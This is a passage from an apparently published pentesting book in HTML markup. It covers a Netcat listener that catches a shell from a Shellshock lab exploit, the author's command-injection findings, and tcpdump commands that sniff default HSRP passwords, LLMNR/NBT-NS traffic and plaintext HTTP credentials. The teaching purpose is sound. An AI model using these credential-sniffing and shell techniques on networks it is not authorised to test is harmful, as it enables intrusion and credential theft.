      <li>
       <strong class="source-inline">
        <span class="koboSpan" id="kobo.759.1">
         l
        </span>
       </strong>
       <span class="koboSpan" id="kobo.760.1">
        : listen for
       </span>
       <span class="No-Break">
        <span class="koboSpan" id="kobo.761.1">
         inbound connections
        </span>
       </span>
      </li>
      <li>
       <span class="No-Break">
        <strong class="source-inline">
         <span class="koboSpan" id="kobo.762.1">
          v
         </span>
        </strong>
       </span>
       <span class="No-Break">
        <span class="koboSpan" id="kobo.763.1">
         : verbose
        </span>
       </span>
      </li>
      <li>
       <strong class="source-inline">
        <span class="koboSpan" id="kobo.764.1">
         p 4444
        </span>
       </strong>
       <span class="koboSpan" id="kobo.765.1">
        : local port number
       </span>
       <span class="No-Break">
        <span class="koboSpan" id="kobo.766.1">
         for listener
        </span>
       </span>
      </li>
     </ul>
    </li>
   </ul>
   <p class="callout-heading">
    <span class="koboSpan" id="kobo.767.1">
     Tip
    </span>
   </p>
   <p class="callout">
    <span class="koboSpan" id="kobo.768.1">
     Netcat can create almost any kind of connection you need, acting as either a client or a server.
    </span>
    <span class="koboSpan" id="kobo.768.2">
     It’s commonly used for port scanning, transferring files, port listening, and even as a backdoor
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.769.1">
      in
     </span>
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.770.1">
      pentest
     </span>
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.771.1">
      ing.
     </span>
    </span>
   </p>
   <p>
    <span class="koboSpan" id="kobo.772.1">
     In one terminal, I execute the Netcat command.
    </span>
    <span class="koboSpan" id="kobo.772.2">
     Then, in a second terminal window, I execute the exploit.
    </span>
    <span class="koboSpan" id="kobo.772.3">
     In the terminal where I ran the Netcat command, we see the connection established from
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.773.1">
      10.2.10.1
     </span>
    </strong>
    <span class="koboSpan" id="kobo.774.1">
     .
    </span>
    <span class="koboSpan" id="kobo.774.2">
     Finally, I enter the
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.775.1">
      id
     </span>
    </strong>
    <span class="koboSpan" id="kobo.776.1">
     command to see the user that owns this
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.777.1">
      shell (
     </span>
    </span>
    <span class="No-Break">
     <strong class="source-inline">
      <span class="koboSpan" id="kobo.778.1">
       www-data
      </span>
     </strong>
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.779.1">
      ).
     </span>
    </span>
   </p>
   <p>
    <span class="koboSpan" id="kobo.780.1">
     You can experiment with this for yourself by
    </span>
    <a id="_idIndexMarker381">
    </a>
    <span class="koboSpan" id="kobo.781.1">
     downloading and running
    </span>
    <strong class="bold">
     <span class="koboSpan" id="kobo.782.1">
      vulhub
     </span>
    </strong>
    <span class="koboSpan" id="kobo.783.1">
     (
    </span>
    <a href="https://github.com/vulhub/vulhub">
     <span class="koboSpan" id="kobo.784.1">
      https://github.com/vulhub/vulhub
     </span>
    </a>
    <span class="koboSpan" id="kobo.785.1">
     ) configured to
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.786.1">
      run
     </span>
    </span>
    <span class="No-Break">
     <strong class="source-inline">
      <span class="koboSpan" id="kobo.787.1">
       bash/CVE-2014-6271
      </span>
     </strong>
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.788.1">
      .
     </span>
    </span>
   </p>
   <p class="callout-heading">
    <span class="koboSpan" id="kobo.789.1">
     Tip
    </span>
   </p>
   <p class="callout">
    <span class="koboSpan" id="kobo.790.1">
     When I’m performing pentests, I’m always on the lookout for web application functions that are likely to pass user-supplied input to an operating system command.
    </span>
    <span class="koboSpan" id="kobo.790.2">
     These functions are frequently found in diagnostics testing, such as when web appliances have a ping or traceroute command on the diagnostics page.
    </span>
    <span class="koboSpan" id="kobo.790.3">
     I also pay attention to any parameters that look like they could logically be performing an operating
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.791.1">
      system command.
     </span>
    </span>
   </p>
   <p>
    <span class="koboSpan" id="kobo.792.1">
     Back in 2016, I
    </span>
    <a id="_idIndexMarker382">
    </a>
    <span class="koboSpan" id="kobo.793.1">
     discovered two critical severity vulnerabilities in the web interface
    </span>
    <a id="_idIndexMarker383">
    </a>
    <span class="koboSpan" id="kobo.794.1">
     of a Western Digital MyCloud
    </span>
    <strong class="bold">
     <span class="koboSpan" id="kobo.795.1">
      Network Attached Storage
     </span>
    </strong>
    <span class="koboSpan" id="kobo.796.1">
     (
    </span>
    <strong class="bold">
     <span class="koboSpan" id="kobo.797.1">
      NAS
     </span>
    </strong>
    <span class="koboSpan" id="kobo.798.1">
     ) device (
    </span>
    <a href="https://web.archive.org/web/20170119123248/https://stevencampbell.info/2016/12/command-injection-in-western-digital-mycloud-nas/">
     <span class="koboSpan" id="kobo.799.1">
      https://web.archive.org/web/20170119123248/https://stevencampbell.info/2016/12/command-injection-in-western-digital-mycloud-nas/
     </span>
    </a>
    <span class="koboSpan" id="kobo.800.1">
     ).
    </span>
    <span class="koboSpan" id="kobo.800.2">
     The detail that caught my attention was seeing a parameter named
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.801.1">
      cmd
     </span>
    </strong>
    <span class="koboSpan" id="kobo.802.1">
     in the HTTP request data.
    </span>
    <span class="koboSpan" id="kobo.802.2">
     Upon exploring further, I found that the
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.803.1">
      username
     </span>
    </strong>
    <span class="koboSpan" id="kobo.804.1">
     parameter in the cookie header and the
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.805.1">
      cmd arg
     </span>
    </strong>
    <span class="koboSpan" id="kobo.806.1">
     parameter in the request body were not properly filtering user input before passing the data to commands in the Bash shell.
    </span>
    <span class="koboSpan" id="kobo.806.2">
     Exploiting these vulnerabilities allowed me to execute commands as the
    </span>
    <em class="italic">
     <span class="koboSpan" id="kobo.807.1">
      root
     </span>
    </em>
    <span class="koboSpan" id="kobo.808.1">
     user
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.809.1">
      without authentication.
     </span>
    </span>
   </p>
   <p>
    <span class="koboSpan" id="kobo.810.1">
     During a customer pentest in 2023, I found a command injection vulnerability in a web application that passed user input to the ping command.
    </span>
    <span class="koboSpan" id="kobo.810.2">
     After gaining access to the administrative interface of a web application due to default credentials, I quickly located the diagnostics page.
    </span>
    <span class="koboSpan" id="kobo.810.3">
     The application filtered most of the characters required for shell command injection but overlooked shell expansion characters.
    </span>
    <span class="koboSpan" id="kobo.810.4">
     Eventually, I found that you could send a request to the vulnerable endpoint without including any authentication credentials.
    </span>
    <span class="koboSpan" id="kobo.810.5">
     While the application response would redirect you back to the login page, the response still contained the output of the Bash command.
    </span>
    <span class="koboSpan" id="kobo.810.6">
     This resulted in an unauthenticated command injection as the
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.811.1">
      root user.
     </span>
    </span>
   </p>
   <p>
    <span class="koboSpan" id="kobo.812.1">
     In this section, I’ve provided you with merely a taste of network exploitation in Bash.
    </span>
    <span class="koboSpan" id="kobo.812.2">
     Later chapters will explore more exploitation techniques, as well as dive into post-exploitation commands in Bash.
    </span>
    <span class="koboSpan" id="kobo.812.3">
     Next up, we’ll be taking a look at using Bash for network
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.813.1">
      traffic analysis.
     </span>
    </span>
   </p>
   <h1 id="_idParaDest-121">
    <a id="_idTextAnchor161">
    </a>
    <span class="koboSpan" id="kobo.814.1">
     Network traffic analysis
    </span>
   </h1>
   <p>
    <span class="koboSpan" id="kobo.815.1">
     In this section, we’ll be
    </span>
    <a id="_idIndexMarker384">
    </a>
    <span class="koboSpan" id="kobo.816.1">
     exploring commands in the Bash shell to capture and analyze
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.817.1">
      network traffic.
     </span>
    </span>
   </p>
   <p>
    <span class="koboSpan" id="kobo.818.1">
     Before I jumped into pentesting, I worked in various IT jobs.
    </span>
    <span class="koboSpan" id="kobo.818.2">
     At one point, I earned the
    </span>
    <strong class="bold">
     <span class="koboSpan" id="kobo.819.1">
      Cisco Certified Network Associate
     </span>
    </strong>
    <span class="koboSpan" id="kobo.820.1">
     (
    </span>
    <strong class="bold">
     <span class="koboSpan" id="kobo.821.1">
      CCNA
     </span>
    </strong>
    <span class="koboSpan" id="kobo.822.1">
     ) certification.
    </span>
    <span class="koboSpan" id="kobo.822.2">
     The things I learned about networking and packet captures have been valuable in my
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.823.1">
      pentest
     </span>
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.824.1">
      ing career.
     </span>
    </span>
   </p>
   <p>
    <span class="koboSpan" id="kobo.825.1">
     There will be times in your pentesting career when you’ll be faced with testing systems that have been
    </span>
    <a id="_idIndexMarker385">
    </a>
    <span class="koboSpan" id="kobo.826.1">
     repeatedly scanned and tested by others before you.
    </span>
    <span class="koboSpan" id="kobo.826.2">
     At some point in time, you’ll either feel like you’re not good enough and question your ability, or think that there are no vulnerabilities present.
    </span>
    <span class="koboSpan" id="kobo.826.3">
     When this happens, you’ll be forced to dig deeper and think outside the box to uncover vulnerabilities that others have overlooked.
    </span>
    <span class="koboSpan" id="kobo.826.4">
     Understanding networking at a deeper level can frequently be the key to uncovering
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.827.1">
      these vulnerabilities.
     </span>
    </span>
   </p>
   <h2 id="_idParaDest-122">
    <a id="_idTextAnchor162">
    </a>
    <span class="koboSpan" id="kobo.828.1">
     Capturing and analyzing network traffic
    </span>
   </h2>
   <p>
    <span class="koboSpan" id="kobo.829.1">
     One of the first steps I
    </span>
    <a id="_idIndexMarker386">
    </a>
    <span class="koboSpan" id="kobo.830.1">
     perform at the beginning of an internal network pentest is running
    </span>
    <a id="_idIndexMarker387">
    </a>
    <span class="koboSpan" id="kobo.831.1">
     a packet capture using the
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.832.1">
      tcpdump
     </span>
    </strong>
    <span class="koboSpan" id="kobo.833.1">
     command.
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.834.1">
      tcpdump
     </span>
    </strong>
    <span class="koboSpan" id="kobo.835.1">
     is a command-line packet analyzer for Unix-like operating systems.
    </span>
    <span class="koboSpan" id="kobo.835.2">
     It allows users to capture and display the contents of network packets in
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.836.1">
      real time.
     </span>
    </span>
   </p>
   <p>
    <span class="koboSpan" id="kobo.837.1">
     I use
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.838.1">
      this command:
     </span>
    </span>
   </p>
   <pre class="console"><span class="koboSpan" id="kobo.839.1">
$ sudo tcpdump -i eth0 -w packetcapture.pcap</span></pre>
   <p>
    <span class="koboSpan" id="kobo.840.1">
     Let this run for five minutes, then press the
    </span>
    <em class="italic">
     <span class="koboSpan" id="kobo.841.1">
      Ctrl
     </span>
    </em>
    <span class="koboSpan" id="kobo.842.1">
     +
    </span>
    <em class="italic">
     <span class="koboSpan" id="kobo.843.1">
      C
     </span>
    </em>
    <span class="koboSpan" id="kobo.844.1">
     key combination to stop
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.845.1">
      the capture.
     </span>
    </span>
   </p>
   <p>
    <span class="koboSpan" id="kobo.846.1">
     Here’s
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.847.1">
      the explanation:
     </span>
    </span>
   </p>
   <ul>
    <li>
     <strong class="source-inline">
      <span class="koboSpan" id="kobo.848.1">
       sudo
      </span>
     </strong>
     <span class="koboSpan" id="kobo.849.1">
      : The following command requires root privileges.
     </span>
     <span class="koboSpan" id="kobo.849.2">
      The
     </span>
     <strong class="source-inline">
      <span class="koboSpan" id="kobo.850.1">
       sudo
      </span>
     </strong>
     <span class="koboSpan" id="kobo.851.1">
      command elevates the privileges of the
     </span>
     <span class="No-Break">
      <span class="koboSpan" id="kobo.852.1">
       current user.
      </span>
     </span>
    </li>
    <li>
     <strong class="source-inline">
      <span class="koboSpan" id="kobo.853.1">
       tcpdump
      </span>
     </strong>
     <span class="koboSpan" id="kobo.854.1">
      :
     </span>
     <strong class="source-inline">
      <span class="koboSpan" id="kobo.855.1">
       tcpdump
      </span>
     </strong>
     <span class="koboSpan" id="kobo.856.1">
      prints out a description of the contents of packets on a
     </span>
     <span class="No-Break">
      <span class="koboSpan" id="kobo.857.1">
       network interface.
      </span>
     </span>
    </li>
    <li>
     <strong class="source-inline">
      <span class="koboSpan" id="kobo.858.1">
       -i eth0
      </span>
     </strong>
     <span class="koboSpan" id="kobo.859.1">
      : This is the
     </span>
     <strong class="source-inline">
      <span class="koboSpan" id="kobo.860.1">
       tcpdump
      </span>
     </strong>
     <span class="koboSpan" id="kobo.861.1">
      argument to specify the
     </span>
     <span class="No-Break">
      <span class="koboSpan" id="kobo.862.1">
       network interface.
      </span>
     </span>
    </li>
    <li>
     <strong class="source-inline">
      <span class="koboSpan" id="kobo.863.1">
       -w packetcapture.pcap
      </span>
     </strong>
     <span class="koboSpan" id="kobo.864.1">
      : This is the
     </span>
     <strong class="source-inline">
      <span class="koboSpan" id="kobo.865.1">
       tcpdump
      </span>
     </strong>
     <span class="koboSpan" id="kobo.866.1">
      argument to write the data to
     </span>
     <span class="No-Break">
      <span class="koboSpan" id="kobo.867.1">
       a file.
      </span>
     </span>
    </li>
   </ul>
   <p>
    <span class="koboSpan" id="kobo.868.1">
     Next, I use various
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.869.1">
      tcpdump
     </span>
    </strong>
    <span class="koboSpan" id="kobo.870.1">
     commands to search for interesting data in the capture.
    </span>
    <span class="koboSpan" id="kobo.870.2">
     Once such command is used to detect a default
    </span>
    <strong class="bold">
     <span class="koboSpan" id="kobo.871.1">
      Hot Standby Router Protocol
     </span>
    </strong>
    <span class="koboSpan" id="kobo.872.1">
     (
    </span>
    <strong class="bold">
     <span class="koboSpan" id="kobo.873.1">
      HSRP
     </span>
    </strong>
    <span class="koboSpan" id="kobo.874.1">
     ) password of
    </span>
    <em class="italic">
     <span class="koboSpan" id="kobo.875.1">
      cisco
     </span>
    </em>
    <span class="koboSpan" id="kobo.876.1">
     .
    </span>
    <span class="koboSpan" id="kobo.876.2">
     This
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.877.1">
      tcpdump
     </span>
    </strong>
    <span class="koboSpan" id="kobo.878.1">
     filter checks for the default password (
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.879.1">
      cisco
     </span>
    </strong>
    <span class="koboSpan" id="kobo.880.1">
     ) in the HSRP in the
    </span>
    <a id="_idIndexMarker388">
    </a>
    <span class="koboSpan" id="kobo.881.1">
     packet capture file.
    </span>
    <span class="koboSpan" id="kobo.881.2">
     HSRP allows the configuration of multiple physical routers into a single logical unit with a shared IP address.
    </span>
    <span class="koboSpan" id="kobo.881.3">
     HSRP attacks involve forcibly taking
    </span>
    <a id="_idIndexMarker389">
    </a>
    <span class="koboSpan" id="kobo.882.1">
     over the active router’s role by
    </span>
    <a id="_idIndexMarker390">
    </a>
    <span class="koboSpan" id="kobo.883.1">
     injecting a maximum priority value.
    </span>
    <span class="koboSpan" id="kobo.883.2">
     This can lead to a
    </span>
    <strong class="bold">
     <span class="koboSpan" id="kobo.884.1">
      Man-In-The-Middle
     </span>
    </strong>
    <span class="koboSpan" id="kobo.885.1">
     (
    </span>
    <strong class="bold">
     <span class="koboSpan" id="kobo.886.1">
      MITM
     </span>
    </strong>
    <span class="koboSpan" id="kobo.887.1">
     ) attack.
    </span>
    <span class="koboSpan" id="kobo.887.2">
     If the system is discovered to be using the default password (
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.888.1">
      cisco
     </span>
    </strong>
    <span class="koboSpan" id="kobo.889.1">
     ), this could lead to someone becoming the router and capturing traffic containing
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.890.1">
      sensitive data.
     </span>
    </span>
   </p>
   <p>
    <span class="koboSpan" id="kobo.891.1">
     You can follow along with
    </span>
    <a id="_idIndexMarker391">
    </a>
    <span class="koboSpan" id="kobo.892.1">
     this exercise by downloading the
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.893.1">
      HSRP_election.cap
     </span>
    </strong>
    <span class="koboSpan" id="kobo.894.1">
     file from the book’s
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.895.1">
      GitHub repository.
     </span>
    </span>
   </p>
   <p>
    <span class="koboSpan" id="kobo.896.1">
     The following command demonstrates how to parse a packet capture file using the
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.897.1">
      tcpdump
     </span>
    </strong>
    <span class="koboSpan" id="kobo.898.1">
     command to discover the Cisco HSRP default password
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.899.1">
      in use:
     </span>
    </span>
   </p>
   <pre class="console"><span class="koboSpan" id="kobo.900.1">
$ tcpdump -XX -r packetcapture.pcap udp port 1985 or udp port 2029 | grep -B4 cisco</span></pre>
   <p>
    <span class="koboSpan" id="kobo.901.1">
     Here’s
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.902.1">
      the output:
     </span>
    </span>
   </p>
   <div>
    <div class="IMG---Figure" id="_idContainer059">
     <span class="koboSpan" id="kobo.903.1">
      <img alt="Figure 6.11 – The output of the tcpdump command to display HSRP credentials" src="image/B22229_06_11.jpg"/>
     </span>
    </div>
   </div>
   <p class="IMG---Caption" lang="en-US" xml:lang="en-US">
    <span class="koboSpan" id="kobo.904.1">
     Figure 6.11 – The output of the tcpdump command to display HSRP credentials
    </span>
   </p>
   <p>
    <span class="koboSpan" id="kobo.905.1">
     In this example, we don’t need to preface the
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.906.1">
      tcpdump
     </span>
    </strong>
    <span class="koboSpan" id="kobo.907.1">
     command with
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.908.1">
      sudo
     </span>
    </strong>
    <span class="koboSpan" id="kobo.909.1">
     because we’re reading from a
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.910.1">
      capture file.
     </span>
    </span>
   </p>
   <p>
    <span class="koboSpan" id="kobo.911.1">
     Here’s the rest of
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.912.1">
      the explanation:
     </span>
    </span>
   </p>
   <ul>
    <li>
     <strong class="source-inline">
      <span class="koboSpan" id="kobo.913.1">
       -XX
      </span>
     </strong>
     <span class="koboSpan" id="kobo.914.1">
      : This is a command to print the data of each packet, including its link level header, in hex
     </span>
     <span class="No-Break">
      <span class="koboSpan" id="kobo.915.1">
       and ASCII.
      </span>
     </span>
    </li>
    <li>
     <strong class="source-inline">
      <span class="koboSpan" id="kobo.916.1">
       -r packetcapture.pcap
      </span>
     </strong>
     <span class="koboSpan" id="kobo.917.1">
      : This is a command to read from the packet
     </span>
     <span class="No-Break">
      <span class="koboSpan" id="kobo.918.1">
       capture file.
      </span>
     </span>
    </li>
    <li>
     <strong class="source-inline">
      <span class="koboSpan" id="kobo.919.1">
       udp port 1985 or udp port 2029
      </span>
     </strong>
     <span class="koboSpan" id="kobo.920.1">
      : This is a filter to display only records with the included source or
     </span>
     <span class="No-Break">
      <span class="koboSpan" id="kobo.921.1">
       destination port.
      </span>
     </span>
    </li>
    <li>
     <strong class="source-inline">
      <span class="koboSpan" id="kobo.922.1">
       | grep -B4 cisco
      </span>
     </strong>
     <span class="koboSpan" id="kobo.923.1">
      : We pipe the output of the
     </span>
     <strong class="source-inline">
      <span class="koboSpan" id="kobo.924.1">
       tcpdump
      </span>
     </strong>
     <span class="koboSpan" id="kobo.925.1">
      command to
     </span>
     <strong class="source-inline">
      <span class="koboSpan" id="kobo.926.1">
       grep
      </span>
     </strong>
     <span class="koboSpan" id="kobo.927.1">
      , searching for the word
     </span>
     <em class="italic">
      <span class="koboSpan" id="kobo.928.1">
       cisco
      </span>
     </em>
     <span class="koboSpan" id="kobo.929.1">
      .
     </span>
     <span class="koboSpan" id="kobo.929.2">
      The
     </span>
     <strong class="source-inline">
      <span class="koboSpan" id="kobo.930.1">
       -B4
      </span>
     </strong>
     <span class="koboSpan" id="kobo.931.1">
      option prints the matched line plus four lines before
     </span>
     <a id="_idIndexMarker392">
     </a>
     <span class="koboSpan" id="kobo.932.1">
      the match.
     </span>
     <span class="koboSpan" id="kobo.932.2">
      If you want to print lines after the match, use
     </span>
     <strong class="source-inline">
      <span class="koboSpan" id="kobo.933.1">
       -An
      </span>
     </strong>
     <span class="koboSpan" id="kobo.934.1">
      , where
     </span>
     <strong class="source-inline">
      <span class="koboSpan" id="kobo.935.1">
       n
      </span>
     </strong>
     <span class="koboSpan" id="kobo.936.1">
      is the number
     </span>
     <span class="No-Break">
      <span class="koboSpan" id="kobo.937.1">
       of lines.
      </span>
     </span>
    </li>
   </ul>
   <p class="callout-heading">
    <span class="koboSpan" id="kobo.938.1">
     Important note
    </span>
   </p>
   <p class="callout">
    <span class="koboSpan" id="kobo.939.1">
     Unless you’re onsite sitting at the keyboard of the system that’s running the commands, never attempt to perform an MITM attack on HSRP or other network routing protocols.
    </span>
    <span class="koboSpan" id="kobo.939.2">
     If the attack goes awry, you may lose access to your attack system and be unable to stop the attack.
    </span>
    <span class="koboSpan" id="kobo.939.3">
     The resulting network outage will make people very unhappy!
    </span>
    <span class="koboSpan" id="kobo.939.4">
     It is usually best to simply report this vulnerability and move on because exploiting it risks causing an outage if you make
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.940.1">
      a mistake.
     </span>
    </span>
   </p>
   <p>
    <span class="koboSpan" id="kobo.941.1">
     Other common
    </span>
    <a id="_idIndexMarker393">
    </a>
    <span class="koboSpan" id="kobo.942.1">
     network protocols that are commonly hacked are
    </span>
    <strong class="bold">
     <span class="koboSpan" id="kobo.943.1">
      Link Local Multicast Name Resolution
     </span>
    </strong>
    <span class="koboSpan" id="kobo.944.1">
     (
    </span>
    <strong class="bold">
     <span class="koboSpan" id="kobo.945.1">
      LLMNR
     </span>
    </strong>
    <span class="koboSpan" id="kobo.946.1">
     ) and
    </span>
    <strong class="bold">
     <span class="koboSpan" id="kobo.947.1">
      NetBIOS Name Service
     </span>
    </strong>
    <span class="koboSpan" id="kobo.948.1">
     (
    </span>
    <strong class="bold">
     <span class="koboSpan" id="kobo.949.1">
      NBT-NS
     </span>
    </strong>
    <span class="koboSpan" id="kobo.950.1">
     ).
    </span>
    <span class="koboSpan" id="kobo.950.2">
     You may believe that when you type a domain name such as
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.951.1">
      google.com
     </span>
    </strong>
    <span class="koboSpan" id="kobo.952.1">
     into the web
    </span>
    <a id="_idIndexMarker394">
    </a>
    <span class="koboSpan" id="kobo.953.1">
     browser, command line, or Explorer, a DNS
    </span>
    <a id="_idIndexMarker395">
    </a>
    <span class="koboSpan" id="kobo.954.1">
     server resolves the name to an IP address.
    </span>
    <span class="koboSpan" id="kobo.954.2">
     However, the Microsoft Windows operating system will use LLMNR and NBT-NS to attempt to locate the hostname on the local network if DNS resolution fails.
    </span>
    <span class="koboSpan" id="kobo.954.3">
     Since these are broadcast protocols and are sent to all hosts, they can be poisoned and potentially exploited.
    </span>
    <span class="koboSpan" id="kobo.954.4">
     This scenario happens frequently inside enterprise networks due to software installation or configuration artifacts that have been left behind on systems once the host the software connects to has been decommissioned.
    </span>
    <span class="koboSpan" id="kobo.954.5">
     Just recently I captured plaintext SQL server credentials on a pentest because a host was repeatedly attempting to connect to a server that no longer existed and therefore could not be resolved
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.955.1">
      by DNS.
     </span>
    </span>
   </p>
   <p>
    <span class="koboSpan" id="kobo.956.1">
     The
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.957.1">
      tcpdump
     </span>
    </strong>
    <span class="koboSpan" id="kobo.958.1">
     command I use to detect LLMNR and NBT-NS is
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.959.1">
      as follows:
     </span>
    </span>
   </p>
   <pre class="console"><span class="koboSpan" id="kobo.960.1">
$ tcpdump -r packetcapture.pcap udp port 137 or udp port 5355</span></pre>
   <p>
    <span class="koboSpan" id="kobo.961.1">
     This replays the
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.962.1">
      packetcapture.pcap
     </span>
    </strong>
    <span class="koboSpan" id="kobo.963.1">
     file, filtering for any traffic to or from UDP ports
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.964.1">
      137
     </span>
    </strong>
    <span class="koboSpan" id="kobo.965.1">
     and
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.966.1">
      5355
     </span>
    </strong>
    <span class="koboSpan" id="kobo.967.1">
     .
    </span>
    <span class="koboSpan" id="kobo.967.2">
     If anything is detected by this filter, you may be able to capture password hashes or relay the connections.
    </span>
    <span class="koboSpan" id="kobo.967.3">
     These protocols are trivial to hack during internal network
    </span>
    <a id="_idIndexMarker396">
    </a>
    <span class="koboSpan" id="kobo.968.1">
     pentests.
    </span>
    <span class="koboSpan" id="kobo.968.2">
     We’ll cover this exercise in depth later in
    </span>
    <a href="B22229_10.xhtml#_idTextAnchor260">
     <span class="No-Break">
      <em class="italic">
       <span class="koboSpan" id="kobo.969.1">
        Chapter 10
       </span>
      </em>
     </span>
    </a>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.970.1">
      .
     </span>
    </span>
   </p>
   <p>
    <span class="koboSpan" id="kobo.971.1">
     The following example captures credentials sent over plaintext HTTP.
    </span>
    <span class="koboSpan" id="kobo.971.2">
     You should always provide proof of concept exploits in your pentest report findings whenever possible.
    </span>
    <span class="koboSpan" id="kobo.971.3">
     For example, when you
    </span>
    <a id="_idIndexMarker397">
    </a>
    <span class="koboSpan" id="kobo.972.1">
     report a finding of plaintext services such as HTTP or FTP, providing a screenshot showing how the credentials can be captured shows the system owner why it’s bad to use
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.973.1">
      plaintext services.
     </span>
    </span>
   </p>
   <p>
    <span class="koboSpan" id="kobo.974.1">
     In your terminal, run the following command to filter for plaintext
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.975.1">
      HTTP communication:
     </span>
    </span>
   </p>
   <pre class="console"><span class="koboSpan" id="kobo.976.1">
$ sudo tcpdump -I eth0 -XX 'tcp port 80' | grep -i -B5 pass</span></pre>
   <p>
    <span class="koboSpan" id="kobo.977.1">
     The following figure shows the pentester capturing the plaintext credentials in the
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.978.1">
      command output:
     </span>
    </span>
   </p>
   <div>
    <div class="IMG---Figure" id="_idContainer060">
     <span class="koboSpan" id="kobo.979.1">
      <img alt="Figure 6.12 – Capturing the plaintext credentials in HTTP communication" src="image/B22229_06_12.jpg"/>
     </span>
    </div>
   </div>
   <p class="IMG---Caption" lang="en-US" xml:lang="en-US">
    <span class="koboSpan" id="kobo.980.1">
     Figure 6.12 – Capturing the plaintext credentials in HTTP communication
    </span>
   </p>
   <p>
    <span class="koboSpan" id="kobo.981.1">
     Another packet capture tool I frequently use is Tshark.
    </span>
    <span class="koboSpan" id="kobo.981.2">
     Tshark is a powerful command-line network protocol analyzer that comes bundled with the popular Wireshark
    </span>
    <strong class="bold">
     <span class="koboSpan" id="kobo.982.1">
      graphical user interface
     </span>
    </strong>
    <span class="koboSpan" id="kobo.983.1">
     (
    </span>
    <strong class="bold">
     <span class="koboSpan" id="kobo.984.1">
      GUI
     </span>
    </strong>
    <span class="koboSpan" id="kobo.985.1">
     ) network protocol analyzer.
    </span>
    <span class="koboSpan" id="kobo.985.2">
     While Wireshark provides a user-friendly interface for
    </span>
    <a id="_idIndexMarker398">
    </a>
    <span class="koboSpan" id="kobo.986.1">
     capturing and analyzing network traffic, Tshark allows you to perform similar tasks from the command line.
    </span>
    <span class="koboSpan" id="kobo.986.2">
     Tshark allows you to use more complex capture filters than those provided
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.987.1">
      by Tcpdump.
     </span>
    </span>
   </p>
   <p>
    <span class="koboSpan" id="kobo.988.1">
     If Tshark is not already installed on your system, you can get it by installing Wireshark.
    </span>
    <span class="koboSpan" id="kobo.988.2">
     If you want to use Tshark on a headless system, you can install it without installing the Wireshark GUI on Kali using the
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.989.1">
      following command:
     </span>
    </span>
   </p>
   <pre class="console"><span class="koboSpan" id="kobo.990.1">
$ sudo apt install -y tshark</span></pre>
   <p>
    <span class="koboSpan" id="kobo.991.1">
     One of my use cases for Tshark is when I’m performing a web application pentest.
    </span>
    <span class="koboSpan" id="kobo.991.2">
     The whole time I’m testing the website, I have Tshark running in my terminal.
    </span>
    <span class="koboSpan" id="kobo.991.3">
     This allows me to discover domain takeover vulnerabilities.
    </span>
    <span class="koboSpan" id="kobo.991.4">
     Imagine for a moment that the web developers once used a third-party web service to integrate content into the website.
    </span>
    <span class="koboSpan" id="kobo.991.5">
     Somewhere
    </span>
    <a id="_idIndexMarker399">
    </a>
    <span class="koboSpan" id="kobo.992.1">
     along the way, they may have let that third-party domain go or let the domain name expire.
    </span>
    <span class="koboSpan" id="kobo.992.2">
     If
    </span>
    <a id="_idIndexMarker400">
    </a>
    <span class="koboSpan" id="kobo.993.1">
     you can register that domain name, it may result in the ability to inject content into the
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.994.1">
      web application.
     </span>
    </span>
   </p>
   <p>
